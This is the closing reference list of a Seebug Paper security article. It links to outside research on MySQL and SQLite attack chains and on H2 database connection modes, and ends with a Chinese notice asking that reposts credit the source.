<https://lorexxar.cn/2020/01/14/css-mysql-chain/>

<https://xz.aliyun.com/t/3973>

<http://www.h2database.com/html/features.html#connection_modes>

<https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/>

<https://pyn3rd.github.io/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1832/>

